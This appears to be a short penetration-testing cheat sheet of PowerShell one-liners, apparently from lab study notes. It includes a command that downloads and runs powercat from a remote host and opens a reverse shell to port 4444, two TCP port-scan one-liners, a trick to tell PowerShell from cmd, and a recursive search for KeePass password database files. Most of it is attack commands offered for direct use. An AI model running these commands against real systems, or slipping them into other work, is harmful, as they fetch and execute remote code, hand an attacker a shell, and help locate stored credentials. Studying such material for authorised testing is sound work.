
determine if command line is PowerShell or cmd:

```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

download files from remote server with PowerShell:

```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```

`Test-NetConnection -Port <port> <target_IP>` - Power shell command that can be used to run a port scan from a windows machine. This command will check if the target responds too ICMP and whether a specified TCP port on the target is open. The result of `TcpTestSucceeded` indicated whether the port is open or not.

`1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).connect("TARGET_IP", $_)) "TCP port $_ is open"} 2>$null` - This is a power shell one-liner that will scan the first 1024 ports of our target specified.

`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` find all .kdbx files on the system (password databases used by password managers)
